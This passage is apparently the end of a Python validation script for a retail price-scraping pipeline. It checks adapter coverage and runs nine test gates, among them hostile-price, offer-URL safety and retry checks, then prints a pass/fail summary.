    missing_parent = [a.display_name for a in retailers.ADAPTERS
                      if a.display_name not in retailers.PARENT_COMPANY]
    no_ceiling = [p.id for p in PROFILES if not p.price_ceiling]
    fails = []
    if undeclared:
        fails.append(f"adapters declared by no profile, so untested here: {undeclared}")
    if missing_parent:
        fails.append(f"adapters with no declared parent company: {missing_parent}")
    if no_ceiling:
        fails.append(f"categories with no price_ceiling_crc: {no_ceiling}")
    return fails


def main():
    fails = check_every_adapter_is_covered()
    n1, f1 = check_gate1()
    n2, f2 = check_gate2()
    f3 = check_gate2_control()
    n4, f4 = check_image_coverage_regression()
    n5, f5 = check_spec_tokens_are_not_model_numbers()
    n6, f6 = check_tier1b_requires_brand_agreement()
    n7, f7 = check_featured_requires_an_exact_match()
    n8, f8 = check_offer_urls_are_refused()
    n9, f9 = check_source_collapse()
    n10, f10 = check_transient_retry()
    fails += f1 + f2 + f3 + f4 + f5 + f6 + f7 + f8 + f9 + f10
    adapters = len(retailers.ADAPTERS)
    print(f"adapters: {adapters} · profiles: {len(PROFILES)}")
    print(f"gate 1 (CategoryProfile.keeps)   : {n1} hostile cases")
    print(f"gate 2 (export.assert_contract)  : {n2} hostile cases + "
          f"{len(PROFILES)} controls")
    print(f"gate 3 (image-coverage regression): {n4} cases "
          f"(4 regressions refused, 5 legitimate artifacts published)")
    print(f"gate 4 (spec token != model)     : {n5} cases "
          f"(13 spec tokens x {len(PROFILES)} profiles + 8 real models as controls)")
    print(f"gate 5 (tier1b brand agreement)  : {n6} cases (1 false match + 2 controls)")
    print(f"gate 6 (featured exact-match floor): {n7} cases (5 tier decisions + 3 controls)")
    print(f"gate 7 (offer url -> href safety) : {n8} cases ({len(HOSTILE_URLS)} hostile urls + {n8 - len(HOSTILE_URLS)} declared-host controls)")
    print(f"gate 8 (per-source collapse)      : {n9} cases "
          f"(5 collapses refused, 6 real day-over-day movements published, "
          f"+ override + first-run + scoped-run)")
    print(f"gate 9 (transient retry vs settled) : {n10} cases "
          f"(4 transients recovered, 1 exhausted + ledgered, "
          f"403 ledgered, 404/410 not)")
    if fails:
        print(f"FAIL ({len(fails)}):")
        for f in fails:
            print("  -", f)
        return 1
    print("PASS — every adapter x category x hostile price refused at both gates")
    return 0


if __name__ == "__main__":
    sys.exit(main())
